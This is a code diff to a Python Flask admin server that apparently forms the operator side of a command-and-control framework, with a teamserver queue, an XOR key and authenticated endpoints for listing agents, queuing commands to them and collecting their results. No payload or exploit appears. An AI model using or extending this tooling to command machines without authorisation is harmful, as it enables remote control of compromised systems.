@@ -3,12 +3,13 @@ from functools import wraps
 from queue import Queue
 
 class AdminServer:
-    def __init__(self, port, users_dict, shared_req_queue, auth_required=True, agent_handler=None):
+    def __init__(self, port, users_dict, shared_req_queue, auth_required=True, agent_handler=None, xor_key=None):
         self.port = port
         self.users = users_dict or {}
         self.auth_required = auth_required
-        self.shared_req_queue = shared_req_queue  # <--- permet à un autre module (teamserver HTTP) d'enregistrer ses requêtes ici !
-        self.agent_handler = agent_handler        # <--- NOUVEAU : gestionnaire d'agents (facultatif)
+        self.shared_req_queue = shared_req_queue
+        self.agent_handler = agent_handler
+        self.xor_key = xor_key
         self.app = Flask(__name__)
         self.add_endpoints()
 
@@ -27,7 +28,7 @@ class AdminServer:
                     401,
                     {"WWW-Authenticate": 'Basic realm="Login required"'},
                 )
-            print(f"[+] Successfull authentication for {auth.username}")
+            print(f"[+] Successful authentication for {auth.username}")
             return f(*args, **kwargs)
         return decorated
 
@@ -45,13 +46,54 @@ class AdminServer:
                 reqs.append(self.shared_req_queue.get())
             return jsonify({"requests": reqs})
 
-        # (optionnel) Endpoint d'exemple d'utilisation de l'agent_handler:
-        @self.app.route('/list_agents', methods=['GET'])
+        @self.app.route('/agents', methods=['GET'])
         @self.require_auth
-        def list_agents():
+        def agents():
             if self.agent_handler is not None:
-                return jsonify({"agents": self.agent_handler.all_agents()})
-                return jsonify({"agents": {}})
+                agents = self.agent_handler.all_agents()
+                result = []
+                for aid, info in agents.items():
+                    r = info.copy() if info else {}
+                    r['agent_id'] = aid
+                    result.append(r)
+                return jsonify({"agents": result})
+            else:
+                return jsonify({"agents": []})
+
+        @self.app.route('/agent/<agent_id>/info', methods=['GET'])
+        @self.require_auth
+        def agent_info(agent_id):
+            if self.agent_handler is not None:
+                info = self.agent_handler.get_agent(agent_id)
+                if info:
+                    return jsonify({"info": info})
+                else:
+                    return jsonify({"error": "Agent not found"}), 404
+            else:
+                return jsonify({"error": "No agent_handler"}), 500
+
+        @self.app.route('/agent/<agent_id>/command', methods=['POST'])
+        @self.require_auth
+        def send_command(agent_id):
+            if self.agent_handler is not None:
+                data = request.get_json() or {}
+                command = data.get("command")
+                if not command:
+                    return jsonify({"error": "No command provided"}), 400
+                ok = self.agent_handler.queue_command(agent_id, command)
+                if not ok:
+                    return jsonify({"error": f"Agent {agent_id} not found"}), 404
+                return jsonify({"status": "command queued"})
+            else:
+                return jsonify({"error": "No agent_handler"}), 500
+
+        @self.app.route('/agent/<agent_id>/results', methods=['GET'])
+        @self.require_auth
+        def get_results(agent_id):
+            if self.agent_handler is not None:
+                res = self.agent_handler.pop_agent_results(agent_id)
+                return jsonify({"results": res})
+            return jsonify({"results": []})
 
     def start(self):
         print(f"[+] Admin server started on port {self.port}")
